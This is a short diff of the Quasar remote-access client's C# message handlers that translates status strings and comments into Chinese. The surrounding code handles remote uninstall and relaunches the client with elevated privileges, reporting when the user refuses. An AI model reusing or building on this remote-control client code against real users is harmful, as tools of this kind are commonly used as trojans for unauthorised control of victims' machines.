@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Config;
+﻿﻿using Quasar.Client.Config;
 using Quasar.Client.Networking;
 using Quasar.Client.Setup;
 using Quasar.Client.User;
@@ -55,7 +55,7 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoClientUninstall message)
         {
-            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
+            client.Send(new SetStatus { Message = "正在卸载... 再见 :-(" });
             try
             {
                 new ClientUninstaller().Uninstall();
@@ -63,7 +63,7 @@ namespace Quasar.Client.Messages
             }
             catch (Exception ex)
             {
-                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
+                client.Send(new SetStatus { Message = $"卸载失败: {ex.Message}" });
             }
         }
 
@@ -91,22 +91,22 @@ namespace Quasar.Client.Messages
                     UseShellExecute = true
                 };
 
-                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
+                _application.ApplicationMutex.Dispose();  // 关闭互斥锁以便新进程可以运行
                 try
                 {
                     Process.Start(processStartInfo);
                 }
                 catch
                 {
-                    client.Send(new SetStatus {Message = "User refused the elevation request."});
-                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
+                    client.Send(new SetStatus {Message = "用户拒绝了提升请求。"});
+                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // 重新获取互斥锁
                     return;
                 }
                 _client.Exit();
             }
             else
             {
-                client.Send(new SetStatus { Message = "Process already elevated." });
+                client.Send(new SetStatus { Message = "进程已提升。" });
             }
         }
     }
